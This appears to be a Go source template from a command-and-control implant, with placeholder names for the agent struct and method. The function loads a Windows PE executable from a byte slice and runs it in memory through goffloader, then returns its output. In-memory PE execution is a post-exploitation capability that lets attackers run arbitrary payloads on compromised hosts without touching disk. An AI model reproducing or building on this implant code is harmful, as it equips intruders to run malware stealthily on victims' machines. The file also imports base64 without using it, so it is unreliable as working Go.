package main

import (
	"encoding/base64"
	"fmt"
	"agents/goffloader/src/pe"
)

// Execute PE file in memory using goffloader
func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_PE_FUNC}(peData []byte, args []string) (string, error) {
	if len(peData) < 1024 { // Minimum size check
		return "[ERROR] PE file too small to be valid", fmt.Errorf("PE file too small")
	}

	// Execute the PE file in memory using goffloader
	output, err := pe.RunExecutable(peData, args)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to execute PE in memory: %v", err), err
	}

	return fmt.Sprintf("[SUCCESS] PE executed in memory:\n%s", output), nil
}